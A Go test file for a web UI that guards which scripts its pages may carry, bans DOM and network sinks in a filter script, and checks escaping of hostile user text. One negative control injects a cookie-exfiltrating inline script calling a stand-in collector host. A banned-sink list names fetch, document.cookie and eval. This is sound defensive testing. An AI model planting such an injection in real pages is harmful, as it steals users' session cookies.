package ui

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"regexp"
	"strings"
	"testing"
)

// scriptDigestFromBytes is `stylesheetDigestFromBytes` for the filter script: recomputed from the
// embedded bytes here, never read off `hashAsset`, so the ledger row is checked against the
// bytes this binary serves rather than against the implementation agreeing with itself.
func scriptDigestFromBytes(t *testing.T) string {
	t.Helper()
	if len(filterScript) == 0 {
		t.Fatal("the embedded filter script is EMPTY, so its digest is the digest of nothing")
	}
	sum := sha256.Sum256([]byte(filterScript))
	return hex.EncodeToString(sum[:])[:12]
}

// allowedScriptTag is the EXACT markup an allowlisted script reaches a page as. A literal shape
// here rather than a render of `filterScriptTag()`: the guard below is a claim about what a page
// may carry, and deriving its expectation from the function under test would make it agree with
// whatever that function emits.
func allowedScriptTag(src string) string {
	return `<script src="` + src + `" defer></script>`
}

// scriptViolations is the allowlist guard over rendered bytes: every `<script` in `page` must be
// the exact allowlisted tag for a source in [AllowedScriptSources], and no allowlisted tag may
// appear twice. It returns one line per violation.
//
// 🔴 IT COUNTS CASE-INSENSITIVELY AND MATCHES EXACTLY, AND BOTH HALVES ARE THE POINT. A browser
// parses `<SCRIPT>` as a script, so a lowercase-only count would miss it; and an exact match on
// the whole tag — not a `src=` prefix — is what makes an inline body, an extra attribute or a
// foreign source a violation rather than a near-enough pass.
func scriptViolations(page string) []string {
	var out []string
	lower := strings.ToLower(page)
	seen := map[string]int{}
	for i := 0; ; {
		at := strings.Index(lower[i:], "<script")
		if at < 0 {
			break
		}
		at += i
		matched := ""
		for _, src := range AllowedScriptSources() {
			if strings.HasPrefix(page[at:], allowedScriptTag(src)) {
				matched = src
				break
			}
		}
		if matched == "" {
			end := min(len(page), at+80)
			out = append(out, "a script that is not an allowlisted tag: "+page[at:end])
		} else {
			seen[matched]++
			if seen[matched] == 2 {
				out = append(out, "the allowlisted script "+matched+" appears more than once")
			}
		}
		i = at + len("<script")
	}
	return out
}

// TestEveryBrowsePageCarriesOnlyAllowlistedScripts is the renderer half of the guard that
// replaced this package's zero-script property (see `script.go`): over every browse page, served
// through the real handlers and the real `StoreSource`, every script is an allowlisted
// same-origin `src` and nothing else — and the scope page carries exactly the filter.
//
// 🔴 TWO CONTROLS MAKE ITS ZEROS READABLE. POSITIVE: the scope page's own count must be ONE, so a
// guard wired to nothing (or a page that silently lost its script) is red. NEGATIVE: five
// realistic injections, each spliced into a real page, must each produce a violation — an
// inline script, a foreign `src`, an uppercase tag, the allowlisted tag twice, and the
// allowlisted `src` carrying an inline body.
func TestEveryBrowsePageCarriesOnlyAllowlistedScripts(t *testing.T) {
	root, id, scopeID := recencyWorld(t)
	srv := recencyServer(t, root, id)

	pages := map[string]string{
		"root":         RootPath,
		"scope":        ScopePath + "?" + QueryID + "=" + string(scopeID),
		"navigate":     ScopePath,
		"entry":        entryHref(scopeID, "birch", false),
		"entry raw":    entryHref(scopeID, "birch", true),
		"tag listing":  tagHref("timber"),
		"search":       searchHref("birch"),
		"arc navigate": ArcPath,
		// The session row and the scope page's two non-entries tabs: none renders the filter control,
		// so none may carry the script.
		"session navigate": SessionPath,
		"sessions tab":     ScopePath + "?" + QueryID + "=" + string(scopeID) + "&" + QueryTab + "=" + TabSessions,
		"arcs tab":         ScopePath + "?" + QueryID + "=" + string(scopeID) + "&" + QueryTab + "=" + TabArcs,
	}
	bodies := map[string]string{}
	for name, path := range pages {
		rec := getAs(t, srv, path)
		if rec.Code != http.StatusOK {
			t.Fatalf("%s (%s) answered %d: %s", name, path, rec.Code, rec.Body.String())
		}
		bodies[name] = rec.Body.String()
		if v := scriptViolations(bodies[name]); len(v) != 0 {
			t.Errorf("the %s page carries a script outside the allowlist:\n  %s", name, strings.Join(v, "\n  "))
		}
	}

	// POSITIVE CONTROL: the scope page carries the filter, exactly once.
	if n := strings.Count(bodies["scope"], allowedScriptTag(FilterScriptPath)); n != 1 {
		t.Fatalf("the scope page carries the filter script %d time(s), want exactly 1 — without it every zero "+
			"above is a guard that never saw a script", n)
	}
	// And the pages with no filter control carry no script at all: a script with nothing to drive is
	// still a script the allowlist has to answer for.
	for _, name := range []string{"root", "entry", "entry raw", "navigate", "tag listing", "search", "arc navigate",
		"session navigate", "sessions tab", "arcs tab"} {
		if n := strings.Count(strings.ToLower(bodies[name]), "<script"); n != 0 {
			t.Errorf("the %s page carries %d script element(s), want 0: only the scope page has a control to drive", name, n)
		}
	}

	// NEGATIVE CONTROLS, spliced into the REAL scope page so the guard reads a realistic document.
	base := bodies["scope"]
	inject := func(extra string) string { return strings.Replace(base, "</main>", extra+"</main>", 1) }
	for name, page := range map[string]string{
		"an inline script":           inject(`<script>fetch('//collector.invalid/c?'+document.cookie)</script>`),
		"a foreign src":              inject(`<script src="//collector.invalid/x.js" defer></script>`),
		"an uppercase inline script": inject(`<SCRIPT>void 0</SCRIPT>`),
		"the allowlisted tag twice":  inject(allowedScriptTag(FilterScriptPath)),
		"the allowlisted src inline": inject(`<script src="` + FilterScriptPath + `">alert(1)</script>`),
	} {
		if page == base {
			t.Fatalf("the %s control did not change the page, so it controls nothing", name)
		}
		if len(scriptViolations(page)) == 0 {
			t.Errorf("NEGATIVE CONTROL FAILED: %s produced no violation, so the guard above cannot go red", name)
		}
	}
}

// TestTheFilterScriptIsServedAtItsContentHashedRoute: the route the scope page links answers the
// embedded bytes, as JavaScript, under `nosniff` and the immutable cache the digest licenses.
func TestTheFilterScriptIsServedAtItsContentHashedRoute(t *testing.T) {
	if filterScript == "" {
		t.Fatal("the embedded filter script is EMPTY, so everything below is about nothing")
	}
	sum := sha256.Sum256([]byte(filterScript))
	if want := "/static/filter." + hex.EncodeToString(sum[:])[:12] + ".js"; FilterScriptPath != want {
		t.Errorf("FilterScriptPath is %q, want %q — the digest of the bytes this binary serves", FilterScriptPath, want)
	}
	srv := newTestServer(t, staticAuth{testIdentity()})
	rec := getAs(t, srv, FilterScriptPath)
	if rec.Code != http.StatusOK {
		t.Fatalf("%s answered %d", FilterScriptPath, rec.Code)
	}
	for header, want := range map[string]string{
		"Content-Type":           "text/javascript; charset=utf-8",
		"X-Content-Type-Options": "nosniff",
		"Cache-Control":          "public, max-age=31536000, immutable",
	} {
		if got := rec.Header().Get(header); got != want {
			t.Errorf("%s: %s = %q, want %q", FilterScriptPath, header, got, want)
		}
	}
	if rec.Body.String() != filterScript {
		t.Error("the served body is not the embedded script")
	}
	// It is PUBLIC: an anonymous request gets it too (the stylesheet's ruling).
	anon := newTestServer(t, refusingAuth{})
	if r := getAs(t, anon, FilterScriptPath); r.Code != http.StatusOK {
		t.Errorf("an anonymous request for the script answered %d, want 200", r.Code)
	}
}

// bannedScriptSinks are the spellings a page-local filter has no use for. Each is a way to turn
// text into markup or code, or to send something off the page.
var bannedScriptSinks = []string{
	"innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "Function(",
	"setTimeout(", "setInterval(", "fetch(", "XMLHttpRequest", "sendBeacon", "WebSocket",
	"localStorage", "sessionStorage", "document.cookie", "import(", "location",
	"createElement", "setAttribute", "src=", "href",
}

// scriptCode is the filter script with its `//` comments removed — its header NAMES the banned
// sinks in prose, and a scan that read comments would refuse the file for documenting itself.
// The script contains no `//` inside a string or regex literal; the instrument control below
// proves the strip leaves real code in place.
func scriptCode(js string) string {
	return regexp.MustCompile(`(?m)//.*$`).ReplaceAllString(js, "")
}

// TestTheFilterScriptTouchesOnlyWhatItSays pins the sentence at the top of `filter.js`: it
// reads the box and the server's `data-filter`, writes only `hidden` and a count's text, and
// reaches nothing off the page.
//
// ⚠ A SPELLING GUARD, AND LABELLED AS ONE: it can be walked by an obfuscated sink
// (`el["inner"+"HTML"]`). What it catches is the ordinary edit — somebody "improving" the filter
// with `innerHTML` highlighting or a `fetch` — which is the edit that actually happens; the
// review of this file is what catches the other kind.
func TestTheFilterScriptTouchesOnlyWhatItSays(t *testing.T) {
	code := scriptCode(filterScript)
	// INSTRUMENT CONTROL: the strip left the code — the calls the script is built from are there.
	for _, must := range []string{`getAttribute("data-filter")`, ".hidden = ", ".textContent = ", `addEventListener("input"`} {
		if !strings.Contains(code, must) {
			t.Fatalf("the comment-stripped script lacks %q, so the scan below is reading something other than the code", must)
		}
	}
	for _, sink := range bannedScriptSinks {
		if strings.Contains(code, sink) {
			t.Errorf("filter.js uses %q, which a page-local filter has no use for — see the header of filter.js "+
				"and script.go for what it may touch", sink)
		}
	}
	// NEGATIVE CONTROL: the scan sees a real sink in code position.
	if !strings.Contains(scriptCode(filterScript+"\nrows[0].innerHTML = x;\n"), "innerHTML") {
		t.Fatal("NEGATIVE CONTROL FAILED: an innerHTML assignment in code survived the strip as invisible")
	}
}

// TestTheFilterControlIsHiddenUntilTheScriptRevealsIt pins progressive enhancement: without
// script a reader sees every row and NO box that does nothing.
func TestTheFilterControlIsHiddenUntilTheScriptRevealsIt(t *testing.T) {
	root, id, scopeID := recencyWorld(t)
	body := getAs(t, recencyServer(t, root, id), ScopePath+"?"+QueryID+"="+string(scopeID)).Body.String()
	for _, want := range []string{
		`<div class="entry-filter" id="entry-filter-control" hidden>`,
		`<input id="entry-filter" type="search"`,
		`<ul class="entry-list" id="entry-list">`,
		`<p class="filter-count" id="entry-filter-count" aria-live="polite">5 of 5 entries</p>`,
		`<p class="empty" id="entry-filter-empty" hidden>`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("the scope page lacks %q", want)
		}
	}
	// No row is hidden by the SERVER: without script every row shows.
	if n := strings.Count(body, `<li class="entry-row"`); n != 5 {
		t.Errorf("%d entry rows rendered, want 5", n)
	}
	if regexp.MustCompile(`<li class="entry-row"[^>]*\shidden[\s>]`).MatchString(body) {
		t.Error("a row was rendered hidden by the server")
	}
	// INSTRUMENT CONTROL on that regex: it does see a hidden row.
	if !regexp.MustCompile(`<li class="entry-row"[^>]*\shidden[\s>]`).MatchString(`<li class="entry-row" data-filter="x" hidden>`) {
		t.Fatal("the hidden-row regex cannot match a hidden row, so its zero above is vacuous")
	}
	// The box is not a form control that submits anywhere.
	if strings.Contains(body, `name="entry-filter"`) {
		t.Error("the filter box carries a name, so it would submit with any enclosing form")
	}
}

// TestUserTextEscapesInTheFiltersDataAttribute is the escaping guard for the one NEW position the
// filter added: a ref, alias and tag carrying `<`, `"` and `&` reach `data-filter`, a `title`
// and text content, and in each position stay text.
func TestUserTextEscapesInTheFiltersDataAttribute(t *testing.T) {
	const (
		ref   = `r<"&x`
		alias = `a<b"c&d`
		tag   = `t<"&`
	)
	scope := Scope{ID: "scp_fixture", Name: "hostile-notes", Entries: []Entry{{
		Ref: ref, Title: ref, Filename: "r.md", Aliases: []string{alias}, Tags: []string{tag}, MTime: 1,
	}}}
	view := viewOf("operator@example.invalid", []Scope{scope})
	view.Scope = &scope
	out := renderNode(t, ScopePage(view))

	for _, raw := range []string{ref, alias, tag} {
		if strings.Contains(out, raw) {
			t.Errorf("%q reached the page unescaped", raw)
		}
	}
	for what, want := range map[string]string{
		"data-filter (attribute)": `data-filter="r&lt;&#34;&amp;x` + "\n" + `r&lt;&#34;&amp;x` + "\n" + `a&lt;b&#34;c&amp;d` + "\n" + `t&lt;&#34;&amp;"`,
		"title (attribute)":       `title="r&lt;&#34;&amp;x"`,
		// Rendered `hidden` since aliases left the card; `filter.js` reveals it only when it matched.
		"alias chip (text)": `<li hidden>a&lt;b&#34;c&amp;d</li>`,
		"ref link (text)":         `>r&lt;&#34;&amp;x</a>`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("%s: the escaped form %q is not on the page", what, want)
		}
	}
	// The structural differential `TestHostileEntryTextIsEscaped` runs, at this one row: the
	// hostile row and a benign row of the same shape have the same markup shape.
	benign := Scope{ID: "scp_fixture", Name: "hostile-notes", Entries: []Entry{{
		Ref: "rxxxx", Title: "rxxxx", Filename: "r.md", Aliases: []string{"axxxxxx"}, Tags: []string{"txxx"}, MTime: 1,
	}}}
	bview := viewOf("operator@example.invalid", []Scope{benign})
	bview.Scope = &benign
	if got, want := structureOf(out), structureOf(renderNode(t, ScopePage(bview))); got != want {
		t.Errorf("markup shape differs between hostile %+v and benign %+v: user text became markup", got, want)
	}
}
